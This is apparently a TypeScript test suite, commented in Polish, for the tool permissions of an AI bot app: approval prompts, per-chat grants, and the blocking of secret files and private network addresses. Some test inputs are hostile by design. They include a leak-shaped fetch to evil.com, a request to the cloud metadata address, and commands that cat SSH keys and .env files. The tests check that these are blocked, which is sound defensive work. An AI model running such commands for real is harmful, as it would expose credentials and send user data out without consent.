import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { creatorBot, MEMORY_SEP, newBot, newBotChat, serializeBot, type ApprovalDecision, type BotDef } from "../../../src/bot";
import { ApprovalBroker, type ApprovalRequest } from "./approvals";
import { BotStore } from "./store";
import { resolvePath, runTool, toolDefs, type Grant, type ToolContext } from "./tools";

let dir = "";
let store: BotStore;
let home = ""; // folder użytkownika, który bot czyta bez pytania
let outside = ""; // folder spoza bota
let asked: ApprovalRequest[] = [];
let answer: ApprovalDecision = "once";
let broker: ApprovalBroker;

beforeEach(() => {
  dir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "aw-tools-")));
  store = new BotStore(path.join(dir, "bots"), path.join(dir, "trash"), () => 1000);
  home = path.join(dir, "kod");
  outside = path.join(dir, "obcy");
  fs.mkdirSync(path.join(home, "src"), { recursive: true });
  fs.mkdirSync(outside);
  fs.writeFileSync(path.join(home, "src", "main.rs"), "fn main() {\n    println!(\"hej\");\n}\n");
  fs.writeFileSync(path.join(outside, "sekret.txt"), "hasło");
  fs.symlinkSync(outside, path.join(home, "link"));
  store.create(serializeBot(newBot("rust", 1, { name: "Rust", folders: [home] })));
  asked = [];
  answer = "once";
  broker = new ApprovalBroker((e) => {
    if (e.type !== "request") return;
    asked.push(e.req);
    queueMicrotask(() => broker.decide(e.req.id, answer));
  });
});
afterEach(() => fs.rmSync(dir, { recursive: true, force: true }));

const ctx = (extra: Partial<ToolContext> = {}): ToolContext => ({
  store,
  bot: store.load("rust")!,
  chat: "chat-1",
  broker,
  grants: [],
  signal: new AbortController().signal,
  web: { search: async (q) => `wyniki: ${q}`, fetch: async (u) => `strona: ${u}` },
  ...extra,
});
const work = () => path.join(dir, "bots", "rust", "work");

describe("resolvePath", () => {
  it("względna = w katalogu roboczym, dowiązanie rozwinięte, nieistniejący plik pod istniejącym przodkiem", () => {
    expect(resolvePath("a.txt", work())).toBe(path.join(work(), "a.txt"));
    expect(resolvePath(path.join(home, "link", "sekret.txt"), work())).toBe(path.join(outside, "sekret.txt"));
    expect(resolvePath(path.join(home, "link", "nowy", "x.txt"), work())).toBe(path.join(outside, "nowy", "x.txt"));
    expect(resolvePath(`${home}/src/../../obcy/sekret.txt`, work())).toBe(path.join(outside, "sekret.txt"));
    expect(resolvePath("~", work())).toBe(fs.realpathSync(os.homedir()));
  });
});

describe("toolDefs", () => {
  it("tylko włączone grupy; Kreator ma swoje", () => {
    const quiet: BotDef = newBot("q", 0, { tools: { web: true, read: false, write: false, bash: false, memory: false, skills: false } });
    expect(toolDefs(quiet).map((t) => t.name)).toEqual(["web_search", "web_fetch"]);
    expect(toolDefs(creatorBot(0)).map((t) => t.name)).toContain("bot_create");
    expect(toolDefs(newBot("a", 0)).map((t) => t.name)).not.toContain("bot_create");
  });
});

describe("pliki", () => {
  it("odczyt w folderze bota bez pytania, z numerami linii", async () => {
    const r = await runTool("read_file", { path: path.join(home, "src", "main.rs") }, ctx());
    expect(r).toEqual({ ok: true, text: '1\tfn main() {\n2\t    println!("hej");\n3\t}', approval: "auto" });
    expect(asked).toEqual([]);
  });

  it("offset i limit", async () => {
    const r = await runTool("read_file", { path: path.join(home, "src", "main.rs"), offset: 2, limit: 1 }, ctx());
    expect(r.text).toBe('2\t    println!("hej");\n[linie 2–2 z 3]');
  });

  it("odczyt przez dowiązanie na zewnątrz pyta o zgodę, odmowa wraca do modelu", async () => {
    answer = "deny";
    const r = await runTool("read_file", { path: path.join(home, "link", "sekret.txt") }, ctx());
    expect(r.ok).toBe(false);
    expect(r.approval).toBe("deny");
    expect(r.text).toContain("odmówił");
    expect(asked[0].title).toContain(path.join(outside, "sekret.txt"));
  });

  it("zgoda „w tej rozmowie” na odczyt: drugi raz bez pytania", async () => {
    answer = "chat";
    const grants: Grant[] = [];
    const c = ctx({ grants });
    expect((await runTool("read_file", { path: path.join(outside, "sekret.txt") }, c)).text).toBe("1\thasło");
    expect(await runTool("list_dir", { path: outside }, c)).toMatchObject({ ok: true });
    expect(asked).toHaveLength(2); // list_dir to osobne narzędzie
    expect((await runTool("read_file", { path: path.join(outside, "sekret.txt") }, c)).approval).toBe("auto");
    expect(asked).toHaveLength(2);
    expect(grants).toEqual([{ tool: "read_file", dir: outside }, { tool: "list_dir", dir: outside }]);
  });

  it("zgoda „w tej rozmowie” nie wychodzi poza katalog: inny plik, `..`, dowiązanie", async () => {
    answer = "chat";
    const grants: Grant[] = [];
    const c = ctx({ grants });
    await runTool("read_file", { path: path.join(outside, "sekret.txt") }, c);
    expect(asked).toHaveLength(1);
    const other = fs.mkdtempSync(path.join(dir, "inny-"));
    fs.writeFileSync(path.join(other, "x.txt"), "x");
    expect((await runTool("read_file", { path: path.join(other, "x.txt") }, c)).approval).toBe("chat");
    expect(asked).toHaveLength(2);
    // `..` z katalogu zgody
    const third = fs.mkdtempSync(path.join(dir, "trzeci-"));
    fs.writeFileSync(path.join(third, "x.txt"), "x");
    expect((await runTool("read_file", { path: path.join(outside, "..", path.basename(third), "x.txt") }, c)).approval).toBe("chat");
    // dowiązanie z folderu bota do katalogu zgody: cel po realpath leży w katalogu zgody
    expect((await runTool("read_file", { path: path.join(home, "link", "sekret.txt") }, c)).approval).toBe("auto");
    // dowiązanie do innego katalogu nie dziedziczy zgody
    const fourth = fs.mkdtempSync(path.join(dir, "czwarty-"));
    fs.writeFileSync(path.join(fourth, "x.txt"), "x");
    fs.symlinkSync(fourth, path.join(home, "link2"));
    expect((await runTool("read_file", { path: path.join(home, "link2", "x.txt") }, c)).approval).toBe("chat");
    // zgoda na odczyt nie obejmuje zapisu
    answer = "once";
    expect((await runTool("write_file", { path: path.join(outside, "n.txt"), content: "a" }, c)).approval).toBe("once");
  });

  it("zgoda na zapis dotyczy katalogu pliku", async () => {
    answer = "chat";
    const grants: Grant[] = [];
    const c = ctx({ grants });
    await runTool("write_file", { path: path.join(outside, "a.txt"), content: "a" }, c);
    expect(grants).toEqual([{ tool: "write_file", dir: outside }]);
    expect((await runTool("write_file", { path: path.join(outside, "b.txt"), content: "b" }, c)).approval).toBe("auto");
    expect((await runTool("write_file", { path: path.join(dir, "b.txt"), content: "b" }, c)).approval).toBe("chat");
  });

  it("plik w katalogu głównym: zgoda w rozmowie niedostępna", async () => {
    answer = "chat";
    const grants: Grant[] = [];
    await runTool("read_file", { path: "/nieistniejacy-aw-test" }, ctx({ grants }));
    expect(asked[0].canGrant).toBe(false);
    expect(grants).toEqual([]);
  });

  it("list_dir: domyślnie katalog roboczy, foldery z /", async () => {
    expect((await runTool("list_dir", {}, ctx())).text).toContain("pusty folder");
    const r = await runTool("list_dir", { path: home }, ctx());
    expect(r.text.split("\n").slice(1)).toEqual(["link/", "src/"]);
  });

  it("zapis w katalogu roboczym bez pytania, poza nim z pytaniem i podglądem treści", async () => {
    expect(await runTool("write_file", { path: "notatki/a.md", content: "# A" }, ctx())).toMatchObject({ ok: true, approval: "auto" });
    expect(fs.readFileSync(path.join(work(), "notatki", "a.md"), "utf8")).toBe("# A");
    const r = await runTool("write_file", { path: path.join(home, "README.md"), content: "treść" }, ctx());
    expect(r).toMatchObject({ ok: true, approval: "once" });
    expect(asked[0]).toMatchObject({ title: `Utworzyć plik \`${path.join(home, "README.md")}\`?`, detail: "treść" });
  });

  it("edit_file: unikalny fragment, diff w prośbie", async () => {
    const p = path.join(home, "src", "main.rs");
    const r = await runTool("edit_file", { path: p, old: '"hej"', new: '"cześć"' }, ctx());
    expect(r.ok).toBe(true);
    expect(fs.readFileSync(p, "utf8")).toContain('"cześć"');
    expect(asked[0].detail).toBe('- "hej"\n+ "cześć"');
    expect((await runTool("edit_file", { path: p, old: "nie ma", new: "x" }, ctx())).text).toContain("nie znaleziono");
    fs.writeFileSync(p, "a a a");
    expect((await runTool("edit_file", { path: p, old: "a", new: "b" }, ctx())).text).toContain("3 razy");
    expect(await runTool("edit_file", { path: p, old: "a", new: "$&b", all: true }, ctx())).toMatchObject({ ok: true });
    expect(fs.readFileSync(p, "utf8")).toBe("$&b $&b $&b");
  });

  it("grep przez ripgrep", async () => {
    const r = await runTool("grep", { pattern: "println", path: home }, ctx());
    expect(r.ok).toBe(true);
    expect(r.text).toContain("main.rs:2:");
    expect((await runTool("grep", { pattern: "zzz", path: home }, ctx())).text).toContain("brak dopasowań");
  });

  it("błędy jako wynik, nie wyjątek", async () => {
    expect(await runTool("read_file", {}, ctx())).toMatchObject({ ok: false, text: "brak argumentu `path`" });
    expect((await runTool("read_file", { path: home }, ctx())).text).toContain("to folder");
    expect((await runTool("read_file", { path: "nie-ma.txt" }, ctx())).text).toContain("nie ma pliku");
    expect((await runTool("nieznane", {}, ctx())).text).toContain("nieznane narzędzie");
    expect((await runTool("read_file", "zły", ctx())).ok).toBe(false);
    fs.writeFileSync(path.join(work(), "bin"), Buffer.from([1, 0, 2]));
    expect((await runTool("read_file", { path: "bin" }, ctx())).text).toBe("plik binarny");
  });
});

describe("bash", () => {
  it("zawsze pyta; wynik z kodem wyjścia, w katalogu roboczym", async () => {
    const r = await runTool("bash", { command: "pwd; exit 2" }, ctx());
    expect(r).toMatchObject({ ok: true, approval: "once" });
    expect(r.text).toBe(`${work()}\n\n[kod wyjścia 2]`);
    expect(asked[0].detail).toBe(`pwd; exit 2\n\nw: ${work()}`);
    expect(asked[0].canGrant).toBe(false); // `;` = bez prefiksu
  });

  it("interpreter: bez zgody w rozmowie (python -c, git -c)", async () => {
    answer = "chat";
    const grants: Grant[] = [];
    await runTool("bash", { command: "echo python foo.py" }, ctx({ grants }));
    asked.length = 0;
    await runTool("bash", { command: "python3 --version" }, ctx({ grants }));
    expect(asked[0].canGrant).toBe(false);
    await runTool("bash", { command: "git -c core.sshCommand=x --version" }, ctx({ grants }));
    expect(asked[1].canGrant).toBe(false);
    expect(grants.filter((g) => g.prefix?.startsWith("python") || g.prefix?.startsWith("git"))).toEqual([]);
  });

  it("zgoda w rozmowie na prefiks", async () => {
    answer = "chat";
    const grants: Grant[] = [];
    await runTool("bash", { command: "echo raz" }, ctx({ grants }));
    expect(grants).toEqual([{ tool: "bash", prefix: "echo raz" }]);
    expect((await runTool("bash", { command: "echo raz dwa" }, ctx({ grants }))).approval).toBe("auto");
    expect((await runTool("bash", { command: "echo inne" }, ctx({ grants }))).approval).toBe("chat");
  });

  it("harmonogram: prefiks z góry tylko w folderach bota", async () => {
    const routine = { writeWork: false, bash: ["echo"] };
    expect((await runTool("bash", { command: "echo a" }, ctx({ routine }))).approval).toBe("auto");
    expect((await runTool("bash", { command: "echo a", cwd: home }, ctx({ routine }))).approval).toBe("auto");
    expect((await runTool("bash", { command: "echo a", cwd: outside }, ctx({ routine }))).approval).toBe("once");
    expect((await runTool("bash", { command: "ls" }, ctx({ routine }))).approval).toBe("once");
  });

  it("Stop w trakcie czekania na zgodę = odmowa bez uruchomienia", async () => {
    const slow = new ApprovalBroker(); // nikt nie odpowiada
    const ctl = new AbortController();
    const p = runTool("bash", { command: "touch zrobione" }, ctx({ broker: slow, signal: ctl.signal }));
    setTimeout(() => ctl.abort(), 20);
    expect(await p).toMatchObject({ ok: false, approval: "deny" });
    expect(fs.existsSync(path.join(work(), "zrobione"))).toBe(false);
  });

  it("brak folderu", async () => {
    expect((await runTool("bash", { command: "ls", cwd: path.join(dir, "nie-ma") }, ctx())).text).toContain("nie ma folderu");
  });
});

describe("pamięć, historia, skille, sieć", () => {
  it("memory add/replace/remove i limit", async () => {
    expect(await runTool("memory", { action: "add", target: "user", text: "Lubi Rusta" }, ctx())).toMatchObject({ ok: true });
    await runTool("memory", { action: "add", target: "user", text: "Mieszka w Polsce" }, ctx());
    await runTool("memory", { action: "replace", target: "user", old: "Rusta", text: "Lubi Rusta i Zig" }, ctx());
    expect(store.memory("rust").user).toBe(`Lubi Rusta i Zig${MEMORY_SEP}Mieszka w Polsce`);
    expect((await runTool("memory", { action: "add", target: "memory", text: "x".repeat(3000) }, ctx())).text).toContain("za dużo");
    expect((await runTool("memory", { action: "zgadnij", target: "user" }, ctx())).ok).toBe(false);
    expect(asked).toEqual([]);
  });

  it("history_search pomija bieżącą rozmowę", async () => {
    const m = { provider: "claude", model: "haiku" };
    const old = { ...newBotChat("aaaaaaaa-1", "rust", 1, m), title: "Stara", messages: [{ id: "1", role: "user" as const, text: "Jak działa borrow checker?", at: 0 }] };
    const cur = { ...newBotChat("bbbbbbbb-2", "rust", 2, m), messages: [{ id: "2", role: "user" as const, text: "borrow checker znowu", at: 0 }] };
    store.chatSave(JSON.stringify(old));
    store.chatSave(JSON.stringify(cur));
    const r = await runTool("history_search", { query: "BORROW" }, ctx({ chat: "bbbbbbbb-2" }));
    expect(r.text).toContain("Stara");
    expect(r.text).not.toContain("znowu");
  });

  it("skill_create, skill_view, skill_patch", async () => {
    expect(await runTool("skill_create", { name: "deploy", description: "Wdrożenie", body: "1. build" }, ctx())).toMatchObject({ ok: true });
    expect((await runTool("skill_create", { name: "deploy", description: "x", body: "y" }, ctx())).text).toContain("już jest");
    expect((await runTool("skill_view", { name: "deploy" }, ctx())).text).toContain("1. build");
    expect(await runTool("skill_patch", { name: "deploy", old: "1. build", new: "1. test\n2. build" }, ctx())).toMatchObject({ ok: true });
    expect(store.skill("rust", "deploy")).toContain("1. test\n2. build");
    expect((await runTool("skill_patch", { name: "deploy", old: "name: deploy", new: "name: inna" }, ctx())).text).toContain("zmiana nazwy");
    expect((await runTool("skill_view", { name: "nie-ma" }, ctx())).text).toContain("Są: deploy");
    expect((await runTool("skill_view", { name: "../x" }, ctx())).text).toContain("zła nazwa");
  });

  it("sieć bez pytania", async () => {
    expect(await runTool("web_search", { query: "rust" }, ctx())).toEqual({ ok: true, text: "wyniki: rust", approval: "auto" });
    expect((await runTool("web_fetch", { url: "https://x" }, ctx())).text).toBe("strona: https://x");
  });

  it("web_fetch: adres lokalny pyta (raz, bez grantu), długie query pyta, pełny URL w karcie", async () => {
    const seen: (string | undefined)[] = [];
    const web = { search: async () => "", fetch: async (u: string, _s: AbortSignal, o?: { allowPrivate?: string }) => (seen.push(o?.allowPrivate), `strona: ${u}`) };
    const grants: ToolContext["grants"] = [];
    const r = await runTool("web_fetch", { url: "http://127.0.0.1:8080/x" }, ctx({ web, grants }));
    expect(r).toMatchObject({ ok: true, approval: "once" });
    expect(seen).toEqual(["127.0.0.1:8080"]);
    expect(asked[0]).toMatchObject({ tool: "web_fetch", canGrant: false });
    expect(asked[0].detail).toContain("http://127.0.0.1:8080/x");
    answer = "chat";
    await runTool("web_fetch", { url: "http://localhost:1/" }, ctx({ web, grants }));
    expect(grants).toEqual([]);
    const long = `https://evil.com/?d=${"a".repeat(300)}`;
    await runTool("web_fetch", { url: long }, ctx({ web, grants }));
    expect(asked[2].detail).toContain(long);
    expect(seen[2]).toBeUndefined(); // zgoda na kształt wycieku nie otwiera adresów prywatnych
  });

  it("web_fetch: odmowa nie pobiera; przebieg odrzuca z czytelnym błędem", async () => {
    let n = 0;
    const web = { search: async () => "", fetch: async () => (n++, "x") };
    answer = "deny";
    expect(await runTool("web_fetch", { url: "http://10.0.0.1/" }, ctx({ web }))).toMatchObject({ ok: false });
    const routine = { writeWork: false, bash: [] };
    const r = await runTool("web_fetch", { url: "http://169.254.169.254/" }, ctx({ web, routine }));
    expect(r.ok).toBe(false);
    expect(r.text).toContain("przebieg");
    expect(n).toBe(0);
    expect(asked.length).toBe(1);
  });

  it("wyłączona grupa", async () => {
    const bot = { ...store.load("rust")!, tools: { ...store.load("rust")!.tools, bash: false } };
    expect((await runTool("bash", { command: "ls" }, ctx({ bot }))).text).toContain("wyłączone");
    expect(asked).toEqual([]);
  });
});

describe("Kreator", () => {
  const creator = () => ({ bot: store.list().bots.find((b) => b.builtin)! });

  it("bot_create: pyta, tworzy z id z imienia, skille i wyłączone zadania", async () => {
    const r = await runTool(
      "bot_create",
      {
        name: "Żeglarz",
        emoji: "⛵",
        persona: "Prognozy dla żeglarzy.",
        tone: "playful",
        tools: ["web", "memory"],
        skills: [{ name: "pogoda", description: "Prognoza", body: "1. Szukaj" }],
        routines: [{ name: "Rano", prompt: "Prognoza na dziś", schedule: { kind: "daily", at: "07:00" } }],
      },
      ctx(creator()),
    );
    expect(r).toMatchObject({ ok: true, approval: "once" });
    expect(asked[0].title).toBe("Utworzyć bota „Żeglarz”?");
    expect(asked[0].detail).toBeUndefined();
    expect(asked[0].preview).toMatchObject({
      bot: { id: "zeglarz", name: "Żeglarz", avatar: { emoji: "⛵" } },
      skills: [{ name: "pogoda", description: "Prognoza" }],
      routines: [{ name: "Rano", schedule: { kind: "daily", at: "07:00" } }],
    });
    expect(r.text).toMatch(/^utworzono bota „Żeglarz” \(id: zeglarz\)/);
    const b = store.load("zeglarz")!;
    expect(b).toMatchObject({ name: "Żeglarz", avatar: { emoji: "⛵" }, tone: "playful", tools: { web: true, memory: true, bash: false } });
    expect(store.skills("zeglarz").map((s) => s.name)).toEqual(["pogoda"]);
    expect(JSON.parse(store.routines("zeglarz")).routines[0]).toMatchObject({ id: "r1", enabled: false });
  });

  it("odmowa = nic nie powstaje; złe pola wracają do modelu", async () => {
    answer = "deny";
    await runTool("bot_create", { name: "X", persona: "x" }, ctx(creator()));
    expect(store.load("x")).toBeNull();
    answer = "once";
    expect((await runTool("bot_create", { name: "Y", persona: "y", color: "czerwony" }, ctx(creator()))).text).toContain("color");
    expect((await runTool("bot_create", { name: "Z", persona: "z", routines: [{ name: "a", prompt: "b", schedule: { kind: "every", minutes: 1 } }] }, ctx(creator()))).text).toContain("minutes");
    expect(store.load("z")).toBeNull();
    expect((await runTool("bot_create", { name: "W", persona: "w", tools: ["web", "teleport"] }, ctx(creator()))).text).toContain("tools");
    const twice = [{ name: "a", description: "a", body: "a" }, { name: "a", description: "b", body: "b" }];
    expect((await runTool("bot_create", { name: "V", persona: "v", skills: twice }, ctx(creator()))).text).toContain("tej samej nazwie");
    // Zła definicja nie trafia do użytkownika: tylko pierwsze `X` pytało o zgodę.
    expect(asked).toHaveLength(1);
  });

  it("bot_create bez `model` dostaje model rozmowy Kreatora", async () => {
    const model = { provider: "claude", model: "haiku" };
    await runTool("bot_create", { name: "M", persona: "m" }, ctx({ ...creator(), model }));
    expect(store.load("m")?.model).toEqual(model);
    await runTool("bot_create", { name: "N", persona: "n", model: { provider: "codex", model: "gpt" } }, ctx({ ...creator(), model }));
    expect(store.load("n")?.model).toEqual({ provider: "codex", model: "gpt" });
  });

  it("bot_update zmienia tylko podane pola; zwykły bot nie ma tych narzędzi", async () => {
    expect(await runTool("bot_update", { id: "rust", style: "Krócej." }, ctx(creator()))).toMatchObject({ ok: true });
    expect(store.load("rust")).toMatchObject({ style: "Krócej.", name: "Rust", folders: [home] });
    expect(asked[0]).toMatchObject({ title: "Zmienić bota „Rust”?", preview: { bot: { id: "rust", style: "Krócej." }, changed: ["style"] } });
    expect((await runTool("bot_update", { id: "rust", style: "Krócej." }, ctx(creator()))).text).toContain("nic się nie zmienia");
    expect((await runTool("bot_update", { id: "nikt", style: "x" }, ctx(creator()))).text).toContain("nie ma bota");
    expect(asked).toHaveLength(1);
    expect((await runTool("bot_update", { id: "rust", style: "x" }, ctx())).text).toContain("wyłączone");
  });
});

describe("ścieżki wrażliwe", () => {
  let fakeHome = "";
  let cfg = "";
  const sens = () => ({ home: fakeHome, configDirs: [cfg], exempt: [work()] });
  const run = (name: string, args: unknown, extra: Partial<ToolContext> = {}) => {
    const bot = { ...store.load("rust")!, folders: [fakeHome], tools: { ...store.load("rust")!.tools, bash: true, write: true, read: true } };
    return runTool(name, args, ctx({ bot, sensitive: sens(), ...extra }));
  };
  beforeEach(() => {
    fakeHome = path.join(dir, "dom");
    cfg = path.join(dir, "bots", "..", "cfg");
    fs.mkdirSync(path.join(fakeHome, ".ssh"), { recursive: true });
    fs.mkdirSync(path.join(fakeHome, "proj"), { recursive: true });
    fs.mkdirSync(cfg, { recursive: true });
    fs.writeFileSync(path.join(fakeHome, ".ssh", "id_ed25519"), "TAJNE");
    fs.writeFileSync(path.join(fakeHome, "proj", ".env"), "KEY=1");
    fs.writeFileSync(path.join(fakeHome, "proj", ".env.example"), "KEY=");
    fs.writeFileSync(path.join(fakeHome, "proj", "kod.txt"), "KEY zwykły");
    fs.writeFileSync(path.join(cfg, "accounts.json"), "{}");
    fs.symlinkSync(path.join(fakeHome, ".ssh"), path.join(fakeHome, "proj", "ln"));
  });

  it("odczyt, zapis i edycja sekretów: odmowa bez karty, także przez dowiązanie i `..`", async () => {
    for (const p of [".ssh/id_ed25519", "proj/.env", "proj/ln/id_ed25519", "proj/../.ssh/id_ed25519", path.join(cfg, "accounts.json")]) {
      for (const tool of ["read_file", "write_file"]) {
        const r = await run(tool, { path: p.startsWith("/") ? p : path.join(fakeHome, p), content: "x" });
        expect(r.ok, `${tool} ${p}`).toBe(false);
        expect(r.text).toContain("zablokowany");
      }
    }
    expect(asked).toHaveLength(0);
    expect(fs.readFileSync(path.join(fakeHome, ".ssh", "id_ed25519"), "utf8")).toBe("TAJNE");
  });

  it("szablon .env.example i zwykłe pliki przechodzą; katalog roboczy bota w configDir też", async () => {
    expect((await run("read_file", { path: path.join(fakeHome, "proj", ".env.example") })).ok).toBe(true);
    expect((await run("read_file", { path: path.join(fakeHome, "proj", "kod.txt") })).ok).toBe(true);
    expect((await run("write_file", { path: "notatka.txt", content: "ok" }, { sensitive: { home: fakeHome, configDirs: [path.join(dir, "bots")], exempt: [work()] } })).ok).toBe(true);
  });

  it("grep: po całym domu odmowa, po projekcie pomija .env", async () => {
    expect((await run("grep", { pattern: "TAJNE", path: fakeHome })).ok).toBe(false);
    const r = await run("grep", { pattern: "KEY", path: path.join(fakeHome, "proj") });
    expect(r.text).toContain("kod.txt");
    expect(r.text).not.toContain("KEY=1");
  });

  it("bash: wymienienie sekretu w poleceniu lub cwd daje odmowę bez karty", async () => {
    for (const cmd of ["cat ~/.ssh/id_ed25519", `cat ${fakeHome}/.ssh/id_ed25519`, "cat proj/.env", `ls ${cfg}`]) {
      const r = await run("bash", { command: cmd });
      expect(r.ok, cmd).toBe(false);
      expect(r.text, cmd).toContain("zablokowany");
    }
    expect((await run("bash", { command: "ls .", cwd: path.join(fakeHome, ".ssh") })).ok).toBe(false);
    expect(asked).toHaveLength(0);
    expect((await run("bash", { command: "echo ok" })).ok).toBe(true);
  });
});
